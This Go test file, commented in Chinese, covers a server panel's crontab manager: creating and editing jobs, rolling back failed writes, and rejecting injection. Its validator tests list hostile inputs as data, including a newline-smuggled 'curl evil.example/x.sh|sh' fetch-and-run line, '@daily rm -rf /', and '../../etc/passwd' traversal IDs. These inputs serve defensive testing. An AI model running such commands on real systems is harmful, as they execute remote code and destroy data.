package cron

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

// ============================================================================
// Manager 测试（阶段五 5.2）
// ============================================================================
//
// 覆盖计划明确要求的三项：cron 表达式校验、crontab 解析、**写操作回滚**。
//
// ########## 全程不碰宿主机 crontab ##########
//
// 这些测试用 fileStore（读写工作区临时文件）或内存 store，
// 一次真实的 `crontab` 命令都不会执行。命令模式的行为由
// TestCommandStore* 用**工作区里的假 crontab 脚本**验证，
// 同样不落宿主机 /var/spool/cron。

// ---------------------------------------------------------------------------
// 内存 store（可控失败，用于回滚测试）
// ---------------------------------------------------------------------------

type memStore struct {
	mu      sync.Mutex
	content string
	// writeFailAt / writeFailTimes 控制注入失败。
	writeFailTimes int
	readErr        error
	writes         []string
}

func (s *memStore) Mode() string   { return ModeFile }
func (s *memStore) Target() string { return "内存" }

func (s *memStore) Read(context.Context) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.readErr != nil {
		return "", s.readErr
	}
	return s.content, nil
}

func (s *memStore) Write(_ context.Context, content string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.writeFailTimes > 0 {
		s.writeFailTimes--
		return errors.New("注入的写入失败（模拟磁盘满 / crontab 报错）")
	}
	s.writes = append(s.writes, content)
	s.content = content
	return nil
}

func newTestManager(t *testing.T, store Store) *Manager {
	t.Helper()
	m, err := NewManager(Options{
		Store:   store,
		DataDir: t.TempDir(),
		Logger:  slog.New(slog.NewTextHandler(io.Discard, nil)),
		Now:     func() time.Time { return time.Date(2026, 3, 5, 10, 0, 0, 0, time.Local) },
	})
	if err != nil {
		t.Fatalf("NewManager 失败: %v", err)
	}
	return m
}

// ---------------------------------------------------------------------------
// ① 新增
// ---------------------------------------------------------------------------

func TestCreateAppendsMarkerAndWrapperLine(t *testing.T) {
	st := &memStore{}
	m := newTestManager(t, st)

	res, err := m.Create(context.Background(), JobInput{
		Expression: "*/5 * * * *",
		Command:    "curl -s https://example.com/health | tee -a /tmp/h.log",
		Comment:    "健康检查",
	})
	if err != nil {
		t.Fatalf("Create 失败: %v", err)
	}
	if res.AfterCount != 1 || res.BeforeCount != 0 {
		t.Errorf("任务数变化 %d→%d", res.BeforeCount, res.AfterCount)
	}
	if res.BackupPath == "" {
		t.Error("必须留下备份路径")
	}

	content := st.content
	// crontab 行里**不含任何用户输入**：命令在脚本文件里。
	if strings.Contains(content, "curl") {
		t.Errorf("用户命令泄漏进 crontab 文件，应只存在于包装脚本:\n%s", content)
	}
	if !strings.Contains(content, "# lipanel:"+res.Job.ID+" 健康检查") {
		t.Errorf("缺少标记注释行:\n%s", content)
	}
	markerRe2 := fmt.Sprintf("*/5 * * * * /bin/sh '%s/jobs/%s.sh'", m.DataDir(), res.Job.ID)
	if !strings.Contains(content, markerRe2) {
		t.Errorf("任务行不符合预期模板:\n期望包含 %q\n实际:\n%s", markerRe2, content)
	}

	// 包装脚本内容 = 用户命令原文 + 日志重定向 + 退出码。
	script := readFile(t, filepath.Join(m.DataDir(), "jobs", res.Job.ID+".sh"))
	if !strings.Contains(script, "curl -s https://example.com/health | tee -a /tmp/h.log") {
		t.Errorf("脚本里没有用户命令原文:\n%s", script)
	}
	if !strings.Contains(script, "exit=$rc") {
		t.Errorf("脚本应记录退出码:\n%s", script)
	}
	if fi, err := os.Stat(filepath.Join(m.DataDir(), "jobs", res.Job.ID+".sh")); err != nil || fi.Mode().Perm() != 0o700 {
		t.Errorf("脚本权限应为 0700，实际 %v err=%v", fi.Mode(), err)
	}

	// 备份内容 = 改前内容（此前为空）。
	if got := readFile(t, res.BackupPath); got != "" {
		t.Errorf("首次备份应为空内容，实际 %q", got)
	}
}

// TestCreateIsLineLevel 锁死「不重排用户已有内容」。
func TestCreateIsLineLevel(t *testing.T) {
	st := &memStore{content: "# 用户自己的注释\nMAILTO=\"\"\n\n0 3 * * * user.sh\n# 尾部注释\n"}
	m := newTestManager(t, st)
	if _, err := m.Create(context.Background(), JobInput{Expression: "@daily", Command: "echo hi"}); err != nil {
		t.Fatal(err)
	}
	for _, must := range []string{
		"# 用户自己的注释", "MAILTO=\"\"", "0 3 * * * user.sh", "# 尾部注释",
	} {
		if !strings.Contains(st.content, must) {
			t.Errorf("原有内容丢失: %q\n最终内容:\n%s", must, st.content)
		}
	}
	// 顺序也要保持：注释仍在 MAILTO 之前。
	if strings.Index(st.content, "# 用户自己的注释") > strings.Index(st.content, "MAILTO") {
		t.Error("原有行被重排了")
	}
	// @daily 已展开为标准式（写回的是面板能长期解析的形式）。
	if strings.Contains(st.content, "@daily") {
		t.Error("@ 别名应展开为 5 段式后再写入")
	}
}

// TestCreatePreservesNoCrontabCase 锁死「首次使用（无 crontab）」能正常新增。
func TestCreatePreservesNoCrontabCase(t *testing.T) {
	m := newTestManager(t, &memStore{})
	res, err := m.Create(context.Background(), JobInput{Expression: "@hourly", Command: "echo x"})
	if err != nil {
		t.Fatal(err)
	}
	if res.Job.Valid != true || !res.Job.NextRunHas {
		t.Errorf("返回的任务视图应带有效的下次执行时间: %+v", res.Job)
	}
}

// ---------------------------------------------------------------------------
// ② 编辑 / 收编
// ---------------------------------------------------------------------------

func TestUpdateManagedJobKeepsID(t *testing.T) {
	st := &memStore{}
	m := newTestManager(t, st)
	created, err := m.Create(context.Background(), JobInput{Expression: "0 1 * * *", Command: "echo old", Comment: "旧备注"})
	if err != nil {
		t.Fatal(err)
	}
	res, err := m.Update(context.Background(), created.Job.ID, JobInput{
		Expression: "0 2 * * *", Command: "echo new", Comment: "新备注",
	})
	if err != nil {
		t.Fatalf("Update 失败: %v", err)
	}
	if res.Job.ID != created.Job.ID {
		t.Errorf("面板任务编辑后 id 必须稳定（日志与审计靠它关联）: %s → %s",
			created.Job.ID, res.Job.ID)
	}
	if strings.Count(st.content, "# lipanel:") != 1 {
		t.Errorf("编辑不应产生第二条标记:\n%s", st.content)
	}
	script := readFile(t, filepath.Join(m.DataDir(), "jobs", created.Job.ID+".sh"))
	if !strings.Contains(script, "echo new") || strings.Contains(script, "echo old") {
		t.Errorf("脚本未更新:\n%s", script)
	}
	if !strings.Contains(st.content, "0 2 * * *") || strings.Contains(st.content, "0 1 * * *") {
		t.Errorf("crontab 行未更新:\n%s", st.content)
	}
}

// TestUpdateUnmanagedAdoptsIt 验证「编辑非面板任务 = 收编」。
func TestUpdateUnmanagedAdoptsIt(t *testing.T) {
	st := &memStore{content: "0 3 * * * /usr/local/bin/backup.sh\n"}
	m := newTestManager(t, st)
	before, err := m.List(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if len(before.Jobs) != 1 || before.Jobs[0].Managed {
		t.Fatalf("前置条件：应有一条非面板任务，实际 %+v", before.Jobs)
	}

	res, err := m.Update(context.Background(), before.Jobs[0].ID, JobInput{
		Expression: "0 4 * * *", Command: "backup.sh --verbose", Comment: "收编",
	})
	if err != nil {
		t.Fatalf("收编失败: %v", err)
	}
	// 收编后面板分配一个**不带 u- 前缀**的稳定 id（派生 id 是「未接管」的标记）。
	if !res.Job.Managed || strings.HasPrefix(res.Job.ID, "u-") || !managedIDRe.MatchString(res.Job.ID) {
		t.Errorf("收编后应是面板任务且拿到稳定 id，实际 %+v", res.Job)
	}
	if strings.Contains(st.content, "0 3 * * *") {
		t.Errorf("原行应被替换而不是追加:\n%s", st.content)
	}
	if strings.Count(st.content, "\n") > 3 {
		t.Errorf("收编不应引入多余空行:\n%q", st.content)
	}
	// 收编后日志可用（有包装脚本了）。
	lr, err := m.Logs(context.Background(), res.Job.ID, 10)
	if err != nil {
		t.Fatalf("收编后应可查日志: %v", err)
	}
	if lr.Found {
		t.Error("还没执行过，found 应为 false")
	}
}

// TestUpdateInvalidExpressionJobRejected 锁死「表达式本就不合法的行」不可编辑。
func TestUpdateInvalidExpressionJobRejected(t *testing.T) {
	// 首字段越界：这一行长得像任务（5 段 + 命令），但表达式不被面板支持。
	st := &memStore{content: "99 * * * * something bad\n"}
	m := newTestManager(t, st)
	before, _ := m.List(context.Background())
	if len(before.Jobs) == 0 {
		t.Skip("该行未被识别为任务行，无需断言")
	}
	id := before.Jobs[0].ID
	_, err := m.Update(context.Background(), id, JobInput{Expression: "@daily", Command: "echo x"})
	var inv *ErrJobInvalid
	if !errors.As(err, &inv) {
		t.Errorf("面板不支持的行应拒绝接管，实际 err=%v", err)
	}
}

// ---------------------------------------------------------------------------
// ③ 删除
// ---------------------------------------------------------------------------

func TestDeleteRequiresConfirm(t *testing.T) {
	st := &memStore{}
	m := newTestManager(t, st)
	created, _ := m.Create(context.Background(), JobInput{Expression: "@daily", Command: "echo x"})

	_, err := m.Delete(context.Background(), created.Job.ID, false, nil)
	if !errors.Is(err, ErrConfirmRequired) {
		t.Errorf("不带 confirm 必须返回 ErrConfirmRequired，实际 %v", err)
	}
	// 零副作用。
	if !strings.Contains(st.content, created.Job.ID) {
		t.Error("被拒绝的删除不应改动 crontab")
	}
	if _, err := os.Stat(filepath.Join(m.DataDir(), "jobs", created.Job.ID+".sh")); err != nil {
		t.Error("被拒绝的删除不应删掉包装脚本")
	}
}

func TestDeleteRemovesMarkerLineJobAndScript(t *testing.T) {
	st := &memStore{content: "# 前置注释\nMAILTO=x\n\n"}
	m := newTestManager(t, st)
	a, _ := m.Create(context.Background(), JobInput{Expression: "@daily", Command: "echo a", Comment: "任务A"})
	if _, err := m.Create(context.Background(), JobInput{Expression: "@hourly", Command: "echo b"}); err != nil {
		t.Fatal(err)
	}
	res, err := m.Delete(context.Background(), a.Job.ID, true, nil)
	if err != nil {
		t.Fatalf("删除失败: %v", err)
	}
	if res.AfterCount != 1 {
		t.Errorf("删除后应剩 1 条，实际 %d", res.AfterCount)
	}
	if strings.Contains(st.content, a.Job.ID) || strings.Contains(st.content, "任务A") {
		t.Errorf("标记行或任务行未清干净:\n%s", st.content)
	}
	if strings.Contains(st.content, "echo b") {
		// 另一条任务的命令在脚本里，不在 crontab —— 这里只验证 crontab 不含它。
		t.Error("crontab 不应包含其它任务的命令")
	}
	if _, err := os.Stat(filepath.Join(m.DataDir(), "jobs", a.Job.ID+".sh")); !errors.Is(err, os.ErrNotExist) {
		t.Error("删除任务应一并移除包装脚本（否则留一个无人引用的可执行文件）")
	}
	// 用户的原有内容仍然完好。
	for _, must := range []string{"# 前置注释", "MAILTO=x"} {
		if !strings.Contains(st.content, must) {
			t.Errorf("原有内容丢失: %q\n%s", must, st.content)
		}
	}
}

func TestDeleteUnknownID(t *testing.T) {
	m := newTestManager(t, &memStore{})
	if _, err := m.Delete(context.Background(), "aabbccddeeff", true, nil); !errors.Is(err, ErrJobNotFound) {
		t.Errorf("应返回 ErrJobNotFound，实际 %v", err)
	}
}

// ---------------------------------------------------------------------------
// ④ 回滚（计划明确要求）
// ---------------------------------------------------------------------------

// TestWriteFailureRollbacksCrontab 是本模块最重要的一条测试：
// 写入失败时，crontab 必须回到改前的内容，且备份里留有恢复材料。
func TestWriteFailureRollbacksCrontab(t *testing.T) {
	original := "# 用户资产\nMAILTO=admin@x.com\n0 3 * * * user.sh\n"
	st := &memStore{content: original, writeFailTimes: 1} // 第一次写失败，回滚那次成功
	m := newTestManager(t, st)

	res, err := m.Create(context.Background(), JobInput{
		Expression: "*/5 * * * *", Command: "echo boom", Comment: "会失败的任务",
	})
	if err == nil {
		t.Fatal("写入失败必须报错")
	}
	if !strings.Contains(err.Error(), "已回滚") {
		t.Errorf("错误信息应说明已回滚: %v", err)
	}
	if res == nil {
		t.Fatal("即使失败也要返回结果（含备份路径与回滚状态）")
	}
	if !res.RolledBack {
		t.Error("RolledBack 应为 true")
	}
	if res.RollbackErr != "" {
		t.Errorf("回滚应当成功，实际失败: %s", res.RollbackErr)
	}
	if st.content != original {
		t.Errorf("回滚后内容必须与改前**逐字节一致**：\n got=%q\nwant=%q", st.content, original)
	}
	// 备份里也存有改前内容，作为第二重恢复手段。
	if res.BackupPath == "" {
		t.Error("失败时也必须告知备份路径")
	} else if got := readFile(t, res.BackupPath); got != original {
		t.Errorf("备份内容应等于改前内容，实际 %q", got)
	}
	// 新增任务失败后不能留下孤立的包装脚本。
	if entries := listDir(t, filepath.Join(m.DataDir(), "jobs")); len(entries) != 0 {
		t.Errorf("失败的写入不应留下包装脚本: %v", entries)
	}
}

// TestWriteFailureRollbackAlsoFails 锁死「回滚也失败」时的行为：
// 必须把备份路径交还给用户，并在结果里醒目标出（这是唯一的救命信息）。
func TestWriteFailureRollbackAlsoFails(t *testing.T) {
	original := "0 3 * * * user.sh\n"
	st := &memStore{content: original, writeFailTimes: 2} // 写入 + 回滚都失败
	m := newTestManager(t, st)

	res, err := m.Create(context.Background(), JobInput{Expression: "@daily", Command: "echo x"})
	if err == nil || res == nil {
		t.Fatalf("应报错且返回结果: err=%v res=%v", err, res)
	}
	if res.RollbackErr == "" {
		t.Error("回滚失败必须记录 RollbackErr")
	}
	if !strings.Contains(res.RestoredFrom, "crontab ") || res.BackupPath == "" {
		t.Errorf("必须给出可手工恢复的备份路径，实际 %q / %q", res.RestoredFrom, res.BackupPath)
	}
}

// TestDeleteRollbackRestoresScript 锁死删除失败时脚本要放回去：
// 回滚后的 crontab 仍指向那个脚本，脚本没了任务就会天天报 file not found。
func TestDeleteRollbackRestoresScript(t *testing.T) {
	st := &memStore{}
	m := newTestManager(t, st)
	created, _ := m.Create(context.Background(), JobInput{Expression: "@daily", Command: "echo keep"})
	scriptPath := filepath.Join(m.DataDir(), "jobs", created.Job.ID+".sh")
	before := readFile(t, scriptPath)

	st.writeFailTimes = 1
	_, err := m.Delete(context.Background(), created.Job.ID, true, nil)
	if err == nil {
		t.Fatal("应报错")
	}
	if !strings.Contains(st.content, created.Job.ID) {
		t.Errorf("删除失败后 crontab 必须仍有该任务:\n%s", st.content)
	}
	if after := readFile(t, scriptPath); after != before {
		t.Errorf("删除失败后包装脚本必须原样恢复：\n got=%q\nwant=%q", after, before)
	}
}

// TestBackupFailureRejectsWrite 锁死「备份写不下去就不改 crontab」。
func TestBackupFailureRejectsWrite(t *testing.T) {
	st := &memStore{content: "0 3 * * * user.sh\n"}
	m := newTestManager(t, st)
	// 构造完成后把 backups 目录换成一个普通文件：
	// 之后的 MkdirAll 必然失败（ENOTDIR），模拟「备份写不下去」。
	bakDir := filepath.Join(m.DataDir(), "backups")
	if err := os.RemoveAll(bakDir); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(bakDir, []byte("我是文件不是目录"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := m.Create(context.Background(), JobInput{Expression: "@daily", Command: "echo x"}); err == nil {
		t.Fatal("备份失败必须拒绝写入")
	}
	if st.content != "0 3 * * * user.sh\n" {
		t.Errorf("备份失败时 crontab 必须分毫不动:\n%s", st.content)
	}
}

// ---------------------------------------------------------------------------
// ⑤ 乐观并发（防止覆盖外部改动）
// ---------------------------------------------------------------------------

func TestExpectedJobIDsConflict(t *testing.T) {
	st := &memStore{}
	m := newTestManager(t, st)
	created, _ := m.Create(context.Background(), JobInput{Expression: "@daily", Command: "echo a"})

	// 别人（crontab -e）加了一条，用户还拿着旧的 id 集合来编辑。
	if _, err := m.Create(context.Background(), JobInput{Expression: "@hourly", Command: "echo b"}); err != nil {
		t.Fatal(err)
	}
	_, err := m.Update(context.Background(), created.Job.ID, JobInput{
		Expression: "@weekly", Command: "echo c", ExpectedJobIDs: []string{created.Job.ID},
	})
	var conflict *ErrEditConflict
	if !errors.As(err, &conflict) {
		t.Errorf("应检出并发冲突，实际 %v", err)
	}
	// 集合一致时正常通过。
	list, _ := m.List(context.Background())
	ids := make([]string, 0, len(list.Jobs))
	for _, j := range list.Jobs {
		ids = append(ids, j.ID)
	}
	if _, err := m.Update(context.Background(), created.Job.ID, JobInput{
		Expression: "@weekly", Command: "echo c", ExpectedJobIDs: ids,
	}); err != nil {
		t.Errorf("集合一致时不应报冲突: %v", err)
	}
}

// ---------------------------------------------------------------------------
// ⑥ 校验与注入防线
// ---------------------------------------------------------------------------

func TestCommandRejectsStructureEscaping(t *testing.T) {
	bad := []string{
		"echo ok\n* * * * * curl evil.example/x.sh|sh",
		"echo ok\r\n@daily rm -rf /",
		"echo ok\n",
		"tail -f /var/log/sys\\",
		"echo hi\tthere",
		"echo\x00hi",
	}
	for _, c := range bad {
		if err := ValidateCommand(c); err == nil {
			t.Errorf("应拒绝命令 %q（结构逃逸）", c)
		}
	}
	ok := []string{
		"curl -s https://example.com | sh",
		"find /tmp -name '*.log' -mtime +7 -delete",
		"tar czf /backup/$(date +%F).tgz /srv",
		"a && b; c || d",
		"awk '{print $1}' /etc/passwd",
		"echo \"quoted 'single' back\\`tick\\`\"",
	}
	for _, c := range ok {
		if err := ValidateCommand(c); err != nil {
			t.Errorf("不应拒绝命令 %q（完整 shell 是需求）: %v", c, err)
		}
	}
}

func TestJobIDValidationBlocksTraversal(t *testing.T) {
	for _, id := range []string{"../../etc/passwd", "aabb", "AABBCCDDEEFF", "u-x", "", "aabbccddeeff.sh"} {
		if err := ValidateJobID(id); err == nil {
			t.Errorf("应拒绝 id %q", id)
		}
	}
	for _, id := range []string{"aabbccddeeff", "u-aabbccddeeff"} {
		if err := ValidateJobID(id); err != nil {
			t.Errorf("应接受 id %q: %v", id, err)
		}
	}
}

// TestLogsPathDerivedNotUserControlled 锁死日志接口不是任意文件读取。
func TestLogsPathDerivedNotUserControlled(t *testing.T) {
	st := &memStore{content: "# lipanel:../../etc/passwd x\n0 1 * * * echo hi\n"}
	m := newTestManager(t, st)
	if _, err := m.Logs(context.Background(), "../../etc/passwd", 10); err == nil {
		t.Error("路径形态的 id 必须被拒绝")
	}
	// 非面板 id 只能得到「无日志」的如实回答，而不是别人的日志。
	lr, err := m.Logs(context.Background(), "u-aabbccddeeff", 10)
	if err != nil {
		t.Fatalf("非面板 id 应返回可读结果: %v", err)
	}
	if lr.Found || lr.LogPath != "" {
		t.Errorf("非面板任务不应返回任何日志路径: %+v", lr)
	}
}

// ---------------------------------------------------------------------------
// ⑦ 备份轮换 / 状态
// ---------------------------------------------------------------------------

func TestBackupPruningAndListing(t *testing.T) {
	st := &memStore{}
	m, err := NewManager(Options{
		Store: st, DataDir: t.TempDir(), BackupKeep: 3,
		Logger: slog.New(slog.NewTextHandler(io.Discard, nil)),
	})
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 7; i++ {
		if _, err := m.Create(context.Background(), JobInput{
			Expression: "@daily", Command: fmt.Sprintf("echo run%d", i),
		}); err != nil {
			t.Fatal(err)
		}
		// 时间戳精确到微秒，需要推进时钟才能产生不同文件名。
		m.now = func() time.Time { return time.Now().Add(time.Duration(i+1) * time.Second) }
	}
	bakDir := filepath.Join(m.DataDir(), "backups")
	stamped := 0
	for _, n := range listDir(t, bakDir) {
		if n == "crontab.last.bak" {
			continue
		}
		stamped++
	}
	if stamped > 3 {
		t.Errorf("备份应轮换保留 3 份，实际 %d 份", stamped)
	}
	list, err := m.List(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if len(list.Backups) == 0 {
		t.Error("列表应带上备份清单，用户才知道改坏了去哪找")
	}
	if list.Status.Mode != ModeFile || list.Status.DataDir == "" {
		t.Errorf("列表应内嵌状态: %+v", list.Status)
	}
}

// TestStatusUnavailableReportsReason 锁死「读不到 crontab」是状态而非错误。
func TestStatusUnavailableReportsReason(t *testing.T) {
	st := &memStore{readErr: errors.New("找不到 crontab 命令")}
	m := newTestManager(t, st)
	s := m.Status(context.Background())
	if s.Available {
		t.Error("读失败时 available 必须为 false")
	}
	if !strings.Contains(s.Reason, "crontab") {
		t.Errorf("应带上可读原因，实际 %q", s.Reason)
	}
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

func readFile(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("读 %s 失败: %v", path, err)
	}
	return string(b)
}

func listDir(t *testing.T, dir string) []string {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return nil
		}
		t.Fatalf("列目录 %s 失败: %v", dir, err)
	}
	out := make([]string, 0, len(entries))
	for _, e := range entries {
		out = append(out, e.Name())
	}
	return out
}
